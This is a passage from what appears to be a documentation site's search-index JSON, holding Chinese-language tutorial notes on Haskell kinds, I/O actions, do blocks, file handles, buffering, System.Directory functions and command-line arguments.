fmap :: (a -&gt; b) -&gt; f a -&gt; f b\n</code></pre> \u5176\u4e2d <code>f</code> \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b</p>"},{"location":"cs/pl/haskell/#kinds","title":"Kinds","text":"<p>\u4e00\u4e2a\u503c\u7684\u7c7b\u578b\u53eb\u505a\u7c7b\u578b\uff08Type\uff09\uff0c\u800c\u4e00\u4e2a\u7c7b\u578b\u7684\u7c7b\u578b\u53eb\u505a Kind\u3002\u53ef\u4ee5\u901a\u8fc7 GHCi \u4e2d <code>:k</code> \u6765\u67e5\u770b Kind\uff1a <pre><code>ghci&gt; :k Int\nInt :: *\nghci&gt; :k Maybe\nMaybe :: * -&gt; *\nghci&gt; :k Maybe Int\nMaybe Int :: *\nghci&gt; :k Either\nEither :: * -&gt; * -&gt; *\n</code></pre> \u5176\u4e2d\u7684\u661f\u53f7 <code>*</code> \u4ee3\u8868\u4e86\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08concrete type\uff09\u3002Int \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Int \u7684 Kind \u662f *\u3002\u800c Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Maybe \u7684 Kind \u662f * -&gt; *\u3002\u5982\u679c\u7ed9 Maybe \u4f20\u5165\u4e86\u4e00\u4e2a Int\uff0c\u90a3\u4e48\u5f97\u5230\u7684 Maybe Int \u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\uff0c\u5b83\u7684 Kind \u5c31\u662f *\u3002Either \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4f46\u5b83\u63a5\u6536\u4e24\u4e2a\u7c7b\u578b\u624d\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6240\u4ee5 Either \u7684 Kind \u662f * -&gt; * -&gt; *\u3002</p>"},{"location":"cs/pl/haskell/#inputoutput","title":"Input/Output","text":""},{"location":"cs/pl/haskell/#haskell","title":"\u8fd0\u884c Haskell \u7a0b\u5e8f","text":"<p>\u4e0d\u5728 GHCi \u4e2d\u8fd0\u884c\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ol> <li>\u7f16\u8bd1\u8fd0\u884c\uff1a     <pre><code>$ ghc --make code\n$ ./code\n</code></pre></li> <li>\u901a\u8fc7 <code>runhaskell</code> \u547d\u4ee4\u76f4\u63a5\u8fd0\u884c\uff1a     <pre><code>$ runhaskell code.hs\n</code></pre></li> </ol>"},{"location":"cs/pl/haskell/#_5","title":"\u8f93\u51fa\u6587\u672c","text":"<p>\u5728\u4e00\u4e2a Haskell \u7a0b\u5e8f\u4e2d\u8f93\u51fa\u6587\u5b57\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a main \u51fd\u6570\uff1a <pre><code>main = putStrLn \"Hello World\"\n</code></pre> \u5176\u4e2d putStrLn \u7684\u7c7b\u578b\u662f\uff1a</p> <p>putStrLn :: String -&gt; IO ()</p> <p>putStrLn \u63a5\u6536\u4e00\u4e2a String \u7c7b\u578b\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u4e3a () \u7c7b\u578b\u7684 IO \u52a8\u4f5c\uff08I/O action\uff09\u3002\u6240\u4ee5 main \u51fd\u6570\u7684\u7c7b\u578b\u4e3a IO ()\u3002\uff08IO \u7684 Kind \u662f* -&gt; *\uff09</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u9ed8\u8ba4\u63d0\u4f9b\u7684\u8f93\u51fa\u6587\u672c\u7684\u51fd\u6570\uff1a</p> <ul> <li><code>putStr</code>\uff1a\u8f93\u51fa\u6587\u672c\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c</li> <li><code>putChar</code>\uff1a\u8f93\u51fa\u5355\u4e2a\u5b57\u7b26\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c\u3002\u63a5\u6536\u7684\u53c2\u6570\u4e3a\u5355\u4e2a Char\uff0c\u4e0d\u662f String\uff08\u7528\u5355\u5f15\u53f7\u4e0d\u662f\u53cc\u5f15\u53f7\uff09</li> <li><code>print</code>\uff1a\u53ef\u4ee5\u63a5\u6536\u4efb\u4f55 Show \u7684\u6210\u5458\uff0c\u5148\u7528 show \u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u7136\u540e\u8f93\u51fa\u3002\u7b49\u540c\u4e8e putStrLn . show</li> </ul>"},{"location":"cs/pl/haskell/#do-block","title":"do block","text":"<p>\u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528\u591a\u4e2a putStrLn \u9700\u8981\u4f7f\u7528 do \u8bed\u53e5\uff1a <pre><code>main = do\n    putStrLn \"Line1\"\n    putStrLn \"Line2\"\n</code></pre> \u5176\u4e2d\u6700\u540e\u4e00\u884c\u4e00\u5b9a\u8981\u8fd4\u56de IO () \u7c7b\u578b\u7684\u503c</p>"},{"location":"cs/pl/haskell/#_6","title":"\u8f93\u5165\u6587\u672c","text":"<p>\u8f93\u5165\u6587\u5b57\u9700\u8981\u5728 do \u5757\u4e2d\u4f7f\u7528 getLine\uff1a <pre><code>main = do\n    line &lt;- getLine\n    putStrLn line\n</code></pre> getLine \u7684\u7c7b\u578b\u662f\uff1a</p> <p>getLine :: IO String</p> <p>\u800c &lt;- \u64cd\u4f5c\u7b26\u5c06 getLine \u4e2d\u7684 String \u63d0\u53d6\u4e86\u51fa\u6765\u7ed9\u5230\u4e86 line\uff0c\u4f7f line \u53d8\u6210\u4e86 String \u7c7b\u578b\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32</p> <p>\u800c\u4e14\u4f7f\u7528\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u8981\u7ecf\u8fc7\u4e00\u6b21 &lt;-\uff0c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 getLine \u4f5c\u4e3a\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a getLine \u4e0d\u662f String \u7c7b\u578b\uff0c\u800c\u662f IO String \u7c7b\u578b</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 getChar \u6765\u83b7\u53d6\u5355\u4e2a\u5b57\u7b26\uff0c\u4f46\u4ecd\u7136\u9700\u8981\u4f7f\u7528 &lt;- \u64cd\u4f5c\u7b26\u6765\u63d0\u53d6 Char</p>"},{"location":"cs/pl/haskell/#io","title":"\u5176\u4ed6 IO \u76f8\u5173\u51fd\u6570\u7528\u6cd5","text":""},{"location":"cs/pl/haskell/#return","title":"return","text":"<p>Haskell \u4e2d\u7684 return \u548c\u5176\u4ed6\u547d\u4ee4\u5f0f\u8bed\u8a00\u4e2d\u7684 return \u5b8c\u5168\u4e0d\u540c\uff0c\u5b83\u4e0d\u4f1a\u4f7f\u51fd\u6570\u76f4\u63a5\u7ed3\u675f\u5e76\u8fd4\u56de\u4e00\u4e2a\u503c\u3002</p> <p>main \u51fd\u6570\u5fc5\u987b\u5b9a\u4e49\u4e3a\u7c7b\u578b\u4e3a IO () \u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528 if \u8bed\u53e5\uff0c\u5982\u679c\u4e0d\u8f93\u51fa\u7684\u8bdd\u4e5f\u4e0d\u53ef\u4ee5\u76f4\u63a5\u653e\u4e0b\u4ec0\u4e48\u90fd\u4e0d\u5e72\uff0c\u56e0\u4e3a\u8fd9\u65f6\u5019 main \u51fd\u6570\u7684\u7c7b\u578b\u4e0d\u662f IO ()\u3002\u6240\u4ee5\u8fd9\u65f6\u9700\u8981\u4f7f\u7528 return () \u6765\u4e3a main \u51fd\u6570\u6307\u5b9a\u4e3a IO () \u7c7b\u578b\uff0c\u4f8b\u5982\uff1a <pre><code>main = do \n    line &lt;- getLine\n    if null line\n        then return () -- &lt;-\u8fd9\u91cc\n        else do\n            ...\n</code></pre> \u4f7f\u7528 &lt;- \u64cd\u4f5c\u7b26\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06 return \u8bed\u53e5\u4e2d\u7684\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u6bd4\u5982 a &lt;- return 'A'\uff0c\u6267\u884c\u540e a \u5c31\u662f 'A'\u3002</p>"},{"location":"cs/pl/haskell/#when","title":"when","text":"<p>when \u5305\u542b\u5728 <code>Control.Monad</code> \u6a21\u5757\u4e2d\uff0c\u5b83\u8868\u793a\u5728\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u6761\u4ef6\u4e0b\u4f1a\u6267\u884c\u7b2c\u4e8c\u4e2a\u51fd\u6570\uff0c\u5426\u5219\u4f1a return ()\u3002\u6bd4\u5982\uff1a <pre><code>import Control.Monad   \n\nmain = do  \n    c &lt;- getChar  \n    when (c /= ' ') $ do  \n        putChar c  \n        main  \n</code></pre> \u7b49\u540c\u4e8e\uff1a <pre><code>main = do     \n    c &lt;- getChar  \n    if c /= ' '  \n        then do  \n            putChar c  \n            main  \n        else return () \n</code></pre></p>"},{"location":"cs/pl/haskell/#sequence","title":"sequence","text":"<p>sequence \u5728 IO \u4e2d\u4f7f\u7528\u65f6\u53ef\u4ee5\u8fbe\u6210 [IO a] -&gt; IO [a] \u7684\u6548\u679c\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4f5c\uff1a <pre><code>[a, b, c] &lt;- sequence [getLine, getLine, getLine]\n</code></pre></p>"},{"location":"cs/pl/haskell/#mapm-mapm_","title":"mapM &amp; mapM_","text":"<p>\u5728 IO \u76f8\u5173\u7684\u5730\u65b9\u4f7f\u7528 map\uff0c\u53ef\u4ee5\u4f7f\u7528 mapM \u548c mapM_\uff0c\u5176\u4e2d mapM \u6709\u8fd4\u56de\u503c\u800c mapM_ \u76f4\u63a5\u6254\u6389\u4e86\u8fd4\u56de\u503c\uff1a <pre><code>ghci&gt; mapM print [1,2,3]  \n1  \n2  \n3  \n[(),(),()]  \nghci&gt; mapM_ print [1,2,3]  \n1  \n2  \n3  \n</code></pre></p>"},{"location":"cs/pl/haskell/#forever","title":"forever","text":"<p>forever \u51fd\u6570\u5305\u542b\u5728 <code>Control.Monad</code> \u6a21\u5757\u4e2d\u3002\u5728 main \u51fd\u6570\u5f00\u5934\u52a0\u4e0a forever \u51fd\u6570\u53ef\u4ee5\u4f7f\u540e\u9762\u7684 do \u5757\u4e00\u76f4\u91cd\u590d\u6267\u884c\u76f4\u5230\u7a0b\u5e8f\u88ab\u8feb\u7ec8\u6b62\uff0c\u5982\uff1a <pre><code>import Control.Monad\n\nmain = forever $ do\n    ...\n</code></pre></p>"},{"location":"cs/pl/haskell/#form","title":"forM","text":"<p>forM \u51fd\u6570\u5305\u542b\u5728 <code>Control.Monad</code> \u6a21\u5757\u4e2d\uff0c\u5b83\u7684\u529f\u80fd\u548c mapM \u7c7b\u4f3c\uff0c\u4ece\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e2d\u9010\u4e2a\u53d6\u51fa\u5143\u7d20\u4f20\u5165\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff09\u4e2d\uff0c\u5e76\u4e14\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u8fd4\u56de IO a \u7c7b\u578b\u3002\u6bd4\u5982\uff1a <pre><code>import Control.Monad\n\nmain = do \n    colors &lt;- forM [1, 2, 3, 4] (\\a -&gt; do\n        putStrLn $ \"Which color do you associate with the number \" ++ show a ++ \"?\"  \n        color &lt;- getLine  \n        return color)\n    putStrLn \"The colors that you associate with 1, 2, 3 and 4 are: \"  \n    mapM putStrLn colors\n</code></pre></p>"},{"location":"cs/pl/haskell/#getcontents","title":"getContents","text":"<p>getLine \u83b7\u53d6\u4e00\u6574\u884c\uff0c\u800c getContents \u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u83b7\u53d6\u5168\u90e8\u5185\u5bb9\u76f4\u5230\u9047\u5230 EOF\uff0c\u5e76\u4e14\u5b83\u662f lazy \u7684\uff0c\u5728\u6267\u884c\u4e86 foo &lt;- getContents \u540e\uff0c\u5b83\u5e76\u4e0d\u4f1a\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u4e14\u8d4b\u503c\u5230 foo\uff0c\u800c\u662f\u7b49\u5230\u9700\u8981\u4f7f\u7528 foo \u7684\u65f6\u5019\u518d\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u3002</p> <p>getContents \u5728\u4f7f\u7528\u7ba1\u9053\u4f20\u5165\u6587\u5b57\u65f6\u5f88\u5e38\u7528\uff0c\u53ef\u4ee5\u4ee3\u66ff forever+getLine \u4f7f\u7528\uff0c\u6bd4\u5982\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6587\u4ef6 code.hs\uff1a <pre><code>import Data.Char  \n\nmain = do  \n    contents &lt;- getContents  \n    putStr (map toUpper contents)  \n</code></pre> \u4f7f\u7528 ghc --make code \u7f16\u8bd1\u540e\uff0c\u901a\u8fc7\u7ba1\u9053\u4f20\u5165\u6587\u5b57\uff1a <pre><code>cat text.txt | ./code\n</code></pre> \u4f1a\u5c06 text.txt \u4e2d\u7684\u6240\u6709\u5b57\u6bcd\u8f6c\u4e3a\u5927\u5199\u5e76\u8f93\u51fa</p>"},{"location":"cs/pl/haskell/#interact","title":"interact","text":"<p>\u4e0a\u8ff0\u529f\u80fd\u8fd8\u53ef\u4ee5\u8f6c\u5316\u4e3a\u4e00\u4e2a String -&gt; String \u7684\u51fd\u6570\uff1a <pre><code>upperStrings = unlines . map (map toUpper) . lines\n</code></pre> \u800c\u5728 main \u4e2d\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u5c31\u9700\u8981\uff1a <pre><code>main = do\n    contents &lt;- getContents\n    putStr (upperStrings contents)\n</code></pre> \u4f46\u662f String -&gt; String \u7c7b\u578b\u7684\u51fd\u6570\u5728\u8f93\u5165\u8f93\u51fa\u4e2d\u7684\u4f7f\u7528\u592a\u5e38\u89c1\u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 interact \u51fd\u6570\u6765\u7b80\u5316\u3002interact \u7684\u7c7b\u578b\u662f\uff1a</p> <p>interact :: (String -&gt; String) -&gt; IO ()</p> <p>\u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e00\u4e2a String -&gt; String \u7684\u51fd\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a IO () \u7c7b\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528\u5728 main \u4e0a\u3002</p> <p>\u4e8e\u662f\u6574\u4e2a\u8f6c\u6362\u4e3a\u5927\u5199\u7684\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u7b80\u5316\u4e3a\uff1a <pre><code>main = interact $ unlines . map (map toUpper) . lines\n</code></pre></p>"},{"location":"cs/pl/haskell/#_7","title":"\u6587\u4ef6\u548c\u6d41","text":"<p>\u4ee5\u4e0b\u4e0e\u6587\u4ef6\u548c\u6d41\u76f8\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 <code>System.IO</code> \u6a21\u5757\u4e2d</p>"},{"location":"cs/pl/haskell/#openfile","title":"openFile","text":"<p>openFile \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a</p> <p>openFile :: FilePath -&gt; IOMode -&gt; IO Handle</p> <p>\u5176\u4e2d <code>FilePath</code> \u662f String \u7684 type synonyms\uff0c\u7528\u4e00\u4e2a\u5b57\u7b26\u4e32\u6765\u8868\u793a\u9700\u8981\u6253\u5f00\u7684\u6587\u4ef6\u7684\u8def\u5f84</p> <p><code>IOMode</code>\u7684\u5b9a\u4e49\u662f\uff1a <pre><code>data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode\n</code></pre> \u6240\u4ee5\u5b83\u4e00\u5171\u53ea\u6709\u56db\u4e2a\u503c\uff0c\u7528\u6765\u8868\u793a\u8fdb\u884c IO \u64cd\u4f5c\u7684\u6a21\u5f0f</p> <p>openFile \u8fd4\u56de\u4e00\u4e2a IO Handle \u7c7b\u578b\u7684\u503c\uff0c\u5c06\u5176\u7528 &lt;- \u64cd\u4f5c\u7b26\u63d0\u53d6\u540e\u4f1a\u51fa\u73b0\u4e00\u4e2a Handle \u7684\u503c\u3002\u4f46\u4e0d\u80fd\u4ece Handle \u4e2d\u76f4\u63a5\u4f7f\u7528\u6587\u5b57\uff0c\u8fd8\u9700\u8981\u4f7f\u7528\u4e00\u7cfb\u5217\u51fd\u6570\uff1a</p> <ul> <li><code>hGetContents</code> :: Handle -&gt; IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff0c\u8fd4\u56de\u4e00\u4e2a IO String</li> <li><code>hGetChar</code> :: Handle -&gt; IO Char \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26</li> <li><code>hGetLine</code> :: Handle -&gt; IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a IO String</li> <li><code>hPutStr</code> :: Handle -&gt; String -&gt; IO () \uff0c\u5411 Handle \u4e2d\u8f93\u51fa\u5b57\u7b26\u4e32</li> <li><code>hPutStrLn</code> :: Handle -&gt; String -&gt; IO () \uff0c\u540c\u4e0a</li> </ul> <p>\u5728\u4f7f\u7528 openFile \u8fdb\u884c\u6587\u4ef6\u64cd\u4f5c\u540e\uff0c\u9700\u8981\u4f7f\u7528 hClose \u624b\u52a8\u5173\u95ed Handle\u3002hClose :: Handle -&gt; IO ()\uff0c\u63a5\u6536\u4e00\u4e2a Handle \u5e76\u8fd4\u56de IO ()\uff0c\u53ef\u4ee5\u76f4\u63a5\u653e\u5728 main \u51fd\u6570\u672b\u5c3e</p> <p>\u6240\u4ee5\u4f7f\u7528 openFile \u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5168\u90e8\u5185\u5bb9\u5e76\u8f93\u51fa\u7684\u5168\u90e8\u4ee3\u7801\u662f\uff1a <pre><code>import System.IO\n\nmain = do\n    handle &lt;- openFile \"text.txt\" ReadMode\n    contents &lt;- hGetContents handle\n    putStrLn contents\n    hClose handle\n</code></pre></p>"},{"location":"cs/pl/haskell/#withfile","title":"withFile","text":"<p>withFile \u7c7b\u4f3c Python \u4e2d\u7684 with open\uff0c\u5b83\u5728\u8bfb\u53d6\u6587\u4ef6\u4f7f\u7528\u4e4b\u540e\u4e0d\u9700\u8981\u624b\u52a8 close \u6587\u4ef6\u3002\u5b83\u7684\u7c7b\u578b\u662f\uff1a</p> <p>withFile :: FilePath -&gt; IOMode -&gt; (Handle -&gt; IO a) -&gt; IO a</p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u5b83\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff1a</p> <ul> <li><code>FilePath</code>\uff1a\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684String</li> <li><code>IOMode</code>\uff1a\u6253\u5f00\u6587\u4ef6\u7684\u6a21\u5f0f</li> <li><code>(Handle -&gt; IO a)</code>\uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u5bf9\u8bfb\u53d6\u6587\u4ef6\u540e\u7684Handle\u7d22\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u8fd4\u56de\u4e00\u4e2aI/O action\uff1b\u800c\u8fd9\u4e2a\u8fd4\u56de\u503c\u4e5f\u5c06\u4f5c\u4e3awithFile\u7684\u8fd4\u56de\u503c</li> </ul> <p>\u73b0\u5728\u4f7f\u7528 withFile \u6765\u6539\u5199\u4e0a\u8ff0\u4ee3\u7801\uff1a <pre><code>import System.IO\n\nmain = withFile \"text.txt\" ReadMode (\\handle -&gt; do\n    contents &lt;- hGetContents handle\n    putStrLn contents)\n</code></pre></p> <p>withFile \u7684\u529f\u80fd\u76f8\u5f53\u4e8e\u4ee5\u4e0b\u51fd\u6570\uff1a <pre><code>withFile' :: FilePath -&gt; IOMode -&gt; (Handle -&gt; IO a) -&gt; IO a  \nwithFile' path mode f = do  \n    handle &lt;- openFile path mode   \n    result &lt;- f handle  \n    hClose handle  \n    return result  \n</code></pre></p>"},{"location":"cs/pl/haskell/#readfile","title":"readFile","text":"<p>readFile \u53ef\u4ee5\u66f4\u52a0\u7b80\u5316\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a</p> <p>readFile :: FilePath -&gt; IO String</p> <p>\u5b83\u53ea\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u5176\u4e2d\u4ee5\u5176\u4e2d\u5185\u5bb9\u4e3a\u5185\u5bb9\u7684 I/O action\uff1a <pre><code>import System.IO\n\nmain = do\n    contents &lt;- readFile \"text.txt\"\n    putStrLn contents\n</code></pre></p>"},{"location":"cs/pl/haskell/#writefile","title":"writeFile","text":"<p>writeFile \u7b80\u5316\u4e86\u5199\u5165\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a</p> <p>writeFile :: FilePath -&gt; String -&gt; IO ()</p> <p>\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2aIO ()</p>"},{"location":"cs/pl/haskell/#appendfile","title":"appendFile","text":"<p>appendFile \u7c7b\u4f3c writeFile\uff0c\u4f46\u4f7f\u7528\u5b83\u4e0d\u4f1a\u8986\u76d6\u6587\u4ef6\u4e2d\u539f\u6765\u5185\u5bb9\uff0c\u800c\u662f\u76f4\u63a5\u628a\u5b57\u7b26\u4e32\u6dfb\u52a0\u5230\u6587\u4ef6\u672b\u5c3e</p>"},{"location":"cs/pl/haskell/#buffer","title":"buffer","text":"<p>\u6587\u4ef6\u4ee5\u6d41\u7684\u5f62\u5f0f\u88ab\u8bfb\u53d6\uff0c\u9ed8\u8ba4\u6587\u5b57\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff08buffer\uff09\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u53d6\u4e00\u884c\u5185\u5bb9\uff1b\u9ed8\u8ba4\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4ee5\u5757\u4e3a\u5355\u4f4d\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u5219\u6839\u636e\u7cfb\u7edf\u9ed8\u8ba4\u6765\u9009\u62e9\u3002</p> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>hSetBuffering</code> \u51fd\u6570\u6765\u624b\u52a8\u8bbe\u7f6e\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff1a</p> <p>hSetBuffering :: Handle -&gt; BufferMode -&gt; IO ()</p> <p>\u5b83\u63a5\u6536\u4e00\u4e2a handle\uff0c\u548c\u4e00\u4e2a BufferMode\uff0c\u5e76\u8fd4\u56de IO ()\u3002\u5176\u4e2d BufferMode \u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a</p> <ul> <li><code>NoBuffering</code>\uff1a\u6ca1\u6709\u7f13\u51b2\u533a\uff0c\u4e00\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26</li> <li><code>LineBuffering</code>\uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\u5185\u5bb9</li> <li><code>BlockBuffering (Maybe Int)</code>\uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u5757\uff0c\u5757\u7684\u5927\u5c0f\u7531 Maybe Int \u6307\u5b9a\uff1a<ul> <li><code>BlockBuffering (Nothing)</code>\uff1a\u4f7f\u7528\u7cfb\u7edf\u9ed8\u8ba4\u7684\u5757\u5927\u5c0f</li> <li><code>BlockBuffering (Just 2048)</code>\uff1a\u4e00\u5757\u7684\u5927\u5c0f\u662f 2048 \u5b57\u8282\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165 2048 bytes \u7684\u5185\u5bb9</li> </ul> </li> </ul> <p>\u7f13\u51b2\u533a\u7684\u5237\u65b0\u662f\u81ea\u52a8\u7684\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>hFlush</code> \u6765\u624b\u52a8\u5237\u65b0</p> <p>hFlush :: Handle -&gt; IO ()</p> <p>\u4f20\u5165\u4e00\u4e2a handle\uff0c\u8fd4\u56de IO ()\uff0c\u5373\u5237\u65b0\u5bf9\u5e94 handle \u7684\u7f13\u51b2\u533a</p>"},{"location":"cs/pl/haskell/#opentempfile","title":"openTempFile","text":"<p>openTempFile \u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\uff1a</p> <p>openTempFile :: FilePath -&gt; String -&gt; IO (FilePath, Handle)</p> <p><code>FilePath</code> \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u521b\u5efa\u7684\u4f4d\u7f6e\u8def\u5f84\uff0c<code>String</code> \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u7684\u524d\u7f00\uff0c\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u7b2c\u4e00\u4e2a <code>FilePath</code> \u662f\u521b\u5efa\u5f97\u5230\u7684\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84\uff0c<code>Handle</code> \u662f\u4e34\u65f6\u6587\u4ef6\u7684 handle</p> <p>\u4f8b\u5982\uff1a <pre><code>import System.IO\n\nmain = do\n    (tempFile, tempHandle) &lt;- openTempFile \".\" \"temp\"\n    ...\n    hClose tempHandle\n</code></pre> <code>\".\"</code> \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u5728\u5f53\u524d\u76ee\u5f55\u521b\u5efa\uff0c<code>\"temp\"</code> \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u4ee5 temp \u5f00\u5934\u3002\u6700\u7ec8\u5f97\u5230\u7684 tempFile \u5c31\u662f ./temp.......\uff0ctemp \u540e\u4e3a\u968f\u673a\u6570\u5b57\uff0c\u5982<code>./temp43620-0</code></p>"},{"location":"cs/pl/haskell/#_8","title":"\u8def\u5f84\u64cd\u4f5c","text":"<p>\u76f8\u5173\u51fd\u6570\u90fd\u5305\u542b\u5728 <code>System.Directory</code> \u6a21\u5757\u4e2d\uff0c\u5168\u90e8\u5185\u5bb9\u89c1 System.Directory</p>"},{"location":"cs/pl/haskell/#getcurrentdirectory","title":"getCurrentDirectory","text":"<p>getCurrentDirectory :: IO FilePath</p> <p>\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u8868\u793a\u5f53\u524d\u8def\u5f84\u7684\u7edd\u5bf9\u8def\u5f84</p>"},{"location":"cs/pl/haskell/#removefile","title":"removeFile","text":"<p>removeFile :: FilePath -&gt; IO ()</p> <p>\u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\uff0c\u5e76\u5220\u9664\u6389\u5b83</p>"},{"location":"cs/pl/haskell/#renamefile","title":"renameFile","text":"<p>renameFile :: FilePath -&gt; FilePath -&gt; IO ()</p> <p>\u8f93\u5165\u4e00\u4e2a\u539f\u8def\u5f84\uff0c\u4e00\u4e2a\u65b0\u8def\u5f84\uff0c\u4e3a\u539f\u8def\u5f84\u7684\u6587\u4ef6\u91cd\u547d\u540d\u4e3a\u65b0\u8def\u5f84\u7684\u540d</p>"},{"location":"cs/pl/haskell/#doesfileexist","title":"doesFileExist","text":"<p>doesFileExist :: FilePath -&gt; IO Bool</p> <p>\u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5e03\u5c14\u503c\u7684 I/O action</p>"},{"location":"cs/pl/haskell/#command-line-arguments","title":"Command line arguments","text":"<p><code>System.Environment</code> \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u5904\u7406\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570</p>"},{"location":"cs/pl/haskell/#getargs","title":"getArgs","text":"<p>getArgs :: IO [String]</p> 